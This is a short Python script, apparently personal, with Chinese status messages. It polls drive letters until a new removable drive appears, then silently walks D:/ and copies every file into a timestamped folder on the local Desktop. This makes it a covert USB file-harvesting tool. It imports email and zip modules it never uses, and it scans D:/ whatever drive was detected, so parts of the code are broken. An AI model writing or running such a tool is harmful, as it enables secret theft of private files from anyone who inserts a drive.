import shutil
import datetime
import os
from pathlib import Path
from time import sleep
import smtplib
import zipfile
now = datetime.datetime.now()
a=now.strftime("%Y%m%d%H%M%S")
os.mkdir("C:\\Users\\Tom_2\\Desktop\\娱乐\\codes\\maincodes\\python\\U-disk-downloads\\"+a)
count=2
list1 = ["A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:"]
while True:
    if os.path.exists(list1[count]):
        print("识别到"+list1[count])
        print(count)
        count+=1
    else:
        print(count)
        print("开始获取"+list1[count])
        break
temp=0
while True:
    if os.path.exists(list1[count]):
        print("检测到")
        try:
            for filepath,dirnames,filenames in os.walk("D:/"):
                for filename in filenames:
                    path=os.path.join(filepath,filename)
                    print(os.path.join(filepath,filename))
                    file=os.path.splitext(path)
                    filename,type=file
                    print(type)
                    name_file=Path(os.path.join(filepath,filename)+type).stem
                    back_file=Path(os.path.join(filepath,filename)+type).suffix
                    now = datetime.datetime.now()
                    noww=now.strftime("%Y%m%d%H%M%S")
                    if os.path.join(filepath,filename)+type!="D:/System Volume Information\WPSettings.dat" and os.path.join(filepath,filename)!="D:/System Volume Information\IndexerVolumeGuid":
                        shutil.copy(os.path.join(filepath,filename)+type,r"C:\\Users\\Tom_2\\Desktop\\娱乐\\codes\\maincodes\\python\\U-disk-downloads\\"+a)
                        
            break
        except Exception:
            print("已经复制完毕")
            break
    else:
        print("未插入")
        sleep(1)